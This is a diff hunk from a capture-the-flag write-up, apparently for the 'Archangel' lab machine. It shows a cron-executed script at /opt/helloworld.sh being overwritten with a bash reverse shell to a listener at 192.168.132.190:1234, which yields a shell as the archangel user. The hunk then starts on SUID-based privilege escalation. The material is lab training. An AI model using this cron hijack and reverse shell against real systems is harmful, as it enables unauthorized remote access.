@@ -217,7 +217,7 @@ echo '#!/bin/bash' > /opt/helloworld.sh
 #now append the script with a reverseshell payload
 echo 'bash -i >& /dev/tcp/192.168.132.190/1234 0>&1' >>/opt/helloworld.sh
 ```
-now we will patiently wait for the cronjob to execute in order to get a shell as archangel. after about one minute, we get a shell as archangel on our netcat listner!
+now we will patiently wait for the cronjob to execute in order to get a shell as archangel. after about one minute, we get a shell as archangel on our netcat listner! now we can read and submit the user2.txt flag present at the /home/archangel/secret/user2.txt location
 
 # Phase 3 - Privilege Escalation:
 now its time to level up our game and get root access on the system. the linpeas script revealed about a custom SUID at the location /home/archangel/secret/backup. lets analyze this binary to see what it actually does. since it is a binary, i will contain a lot of gibberish that we wont be able to understand. thus we will use the strings command to filter out only what is readable.
